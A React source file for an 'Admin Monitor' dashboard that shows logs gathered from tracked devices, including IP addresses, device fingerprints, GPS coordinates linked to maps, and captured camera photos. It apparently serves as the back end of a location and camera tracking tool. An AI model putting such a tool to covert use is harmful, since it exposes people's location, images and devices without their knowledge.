import React, { useState } from 'react';
import { LogEntry } from '../types';
import { isSupabaseConfigured } from '../supabaseClient';

interface AdminPanelProps {
  logs: LogEntry[];
}

const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  // Simple sorting: newest first
  const sortedLogs = [...logs].sort((a, b) => 
    new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
  );

  return (
    <div className="min-h-screen bg-gray-100 font-sans text-gray-800">
      {/* Navbar */}
      <div className="bg-white shadow-sm border-b border-gray-200 px-6 py-4 flex justify-between items-center sticky top-0 z-10">
        <div className="flex items-center space-x-3">
          <div className="bg-blue-600 text-white p-2 rounded-lg">
            <i className="fa-solid fa-shield-halved text-xl"></i>
          </div>
          <div>
            <h1 className="text-xl font-bold text-gray-900">Admin Monitor</h1>
            <p className="text-xs text-gray-500">Real-time Intelligence Dashboard</p>
          </div>
        </div>
        <div className="flex items-center space-x-4">
           <span className={`text-xs px-3 py-1 rounded-full font-medium ${
             isSupabaseConfigured ? 'bg-green-100 text-green-700' : 'bg-yellow-100 text-yellow-700'
           }`}>
             {isSupabaseConfigured ? 'Database Connected' : 'Local Simulation'}
           </span>
           <button 
             onClick={() => window.location.href = '/'}
             className="text-sm text-blue-600 hover:text-blue-800 font-medium"
           >
             <i className="fa-solid fa-arrow-left mr-1"></i> Back to Map
           </button>
        </div>
      </div>

      {/* Content */}
      <div className="p-6 max-w-[95%] mx-auto">
        {/* Stats Row */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <div className="bg-white p-5 rounded-xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">Total Logs</p>
            <p className="text-3xl font-bold mt-1">{logs.length}</p>
          </div>
          <div className="bg-white p-5 rounded-xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">Active Devices</p>
            <p className="text-3xl font-bold mt-1">{new Set(logs.map(l => l.device_id)).size}</p>
          </div>
          <div className="bg-white p-5 rounded-xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">Captured Photos</p>
            <p className="text-3xl font-bold mt-1">{logs.filter(l => l.image_data).length}</p>
          </div>
          <div className="bg-white p-5 rounded-xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">Unique IPs</p>
            <p className="text-3xl font-bold mt-1">{new Set(logs.map(l => l.ip_address).filter(ip => ip !== 'Unknown')).size}</p>
          </div>
        </div>

        {/* Data Table */}
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-gray-50">
            <h2 className="font-bold text-gray-700">Incoming Data Stream</h2>
            <button 
              onClick={() => window.location.reload()}
              className="p-2 bg-white border rounded hover:bg-gray-50 transition"
            >
              <i className="fa-solid fa-refresh text-gray-500"></i>
            </button>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full text-left text-sm text-gray-600">
              <thead className="bg-gray-50 text-gray-500 font-medium uppercase text-xs">
                <tr>
                  <th className="px-6 py-3">Timestamp</th>
                  <th className="px-6 py-3">Device & Network</th>
                  <th className="px-6 py-3">Detailed Info</th>
                  <th className="px-6 py-3">Location (Lat/Lng)</th>
                  <th className="px-6 py-3">Camera Feed</th>
                  <th className="px-6 py-3">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {sortedLogs.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-6 py-10 text-center text-gray-400">
                      No data received yet. Activate tracking on the main page.
                    </td>
                  </tr>
                ) : (
                  sortedLogs.map((log) => (
                    <tr key={log.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 whitespace-nowrap align-top">
                        <div className="font-medium text-gray-900">{new Date(log.created_at).toLocaleTimeString()}</div>
                        <div className="text-xs text-gray-400">{new Date(log.created_at).toLocaleDateString()}</div>
                      </td>
                      <td className="px-6 py-4 align-top">
                        <div className="font-mono text-xs text-gray-700 mb-1">
                          ID: {log.device_id.split('_')[1] || log.device_id}
                        </div>
                        {log.ip_address !== 'Unknown' ? (
                          <a 
                            href={`https://whatismyipaddress.com/ip/${log.ip_address}`} 
                            target="_blank" 
                            rel="noopener noreferrer"
                            className="inline-flex items-center px-2 py-0.5 rounded text-[10px] font-medium bg-indigo-50 text-indigo-700 hover:bg-indigo-100 border border-indigo-100"
                          >
                            IP: {log.ip_address} <i className="fa-solid fa-external-link-alt ml-1"></i>
                          </a>
                        ) : (
                          <span className="text-gray-400 text-xs">IP Unknown</span>
                        )}
                      </td>
                      <td className="px-6 py-4 align-top">
                        {log.device_info ? (
                          <div className="text-[10px] space-y-1 bg-gray-50 p-2 rounded border border-gray-100 max-w-[250px]">
                             <div className="grid grid-cols-2 gap-x-2">
                                <span className="text-gray-400">Platform:</span>
                                <span className="font-medium text-gray-700 truncate">{log.device_info.platform}</span>
                             </div>
                             <div className="grid grid-cols-2 gap-x-2">
                                <span className="text-gray-400">Res:</span>
                                <span className="font-medium text-gray-700">{log.device_info.screenResolution}</span>
                             </div>
                             <div className="grid grid-cols-2 gap-x-2">
                                <span className="text-gray-400">Conn:</span>
                                <span className="font-medium text-gray-700">{log.device_info.connectionType}</span>
                             </div>
                             <div className="grid grid-cols-2 gap-x-2">
                                <span className="text-gray-400">RAM:</span>
                                <span className="font-medium text-gray-700">{log.device_info.memory ? `~${log.device_info.memory}GB` : 'N/A'}</span>
                             </div>
                             <div className="border-t border-gray-200 pt-1 mt-1">
                                <div className="text-gray-500 truncate" title={log.device_info.userAgent}>
                                   {log.device_info.userAgent.substring(0, 30)}...
                                </div>
                             </div>
                          </div>
                        ) : (
                          <span className="text-gray-400 text-xs italic">No Info</span>
                        )}
                      </td>
                      <td className="px-6 py-4 align-top">
                        <a 
                          href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="flex items-center space-x-2 text-blue-600 hover:text-blue-800"
                        >
                          <i className="fa-solid fa-map-location-dot"></i>
                          <span>{log.latitude.toFixed(5)}, {log.longitude.toFixed(5)}</span>
                        </a>
                      </td>
                      <td className="px-6 py-4 align-top">
                        {log.image_data ? (
                          <button 
                            onClick={() => setSelectedImage(log.image_data!)}
                            className="relative group w-20 h-14 bg-gray-200 rounded-md overflow-hidden border border-gray-300 hover:border-blue-500 transition-all shadow-sm"
                          >
                            <img src={log.image_data} alt="Capture" className="w-full h-full object-cover" />
                            <div className="absolute inset-0 bg-black/30 group-hover:bg-transparent transition-colors"></div>
                            <div className="absolute inset-0 flex items-center justify-center text-white opacity-0 group-hover:opacity-100">
                               <i className="fa-solid fa-expand shadow-sm"></i>
                            </div>
                          </button>
                        ) : (
                          <span className="text-gray-400 text-xs italic">No Image</span>
                        )}
                      </td>
                      <td className="px-6 py-4 align-top">
                         <span className={`inline-flex items-center px-2 py-0.5 rounded text-xs font-medium ${
                           log.status === 'synced' ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'
                         }`}>
                           {log.status === 'synced' ? 'DB' : 'Local'}
                         </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* Image Modal */}
      {selectedImage && (
        <div 
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 p-4"
          onClick={() => setSelectedImage(null)}
        >
          <div className="relative max-w-4xl w-full max-h-screen">
            <button 
              className="absolute -top-10 right-0 text-white hover:text-gray-300 text-2xl"
              onClick={() => setSelectedImage(null)}
            >
              <i className="fa-solid fa-times"></i>
            </button>
            <img 
              src={selectedImage} 
              alt="Full capture" 
              className="w-full h-auto max-h-[85vh] object-contain rounded-lg border border-gray-700 shadow-2xl" 
            />
            <div className="text-center mt-2 text-gray-400 text-sm">Click anywhere to close</div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminPanel;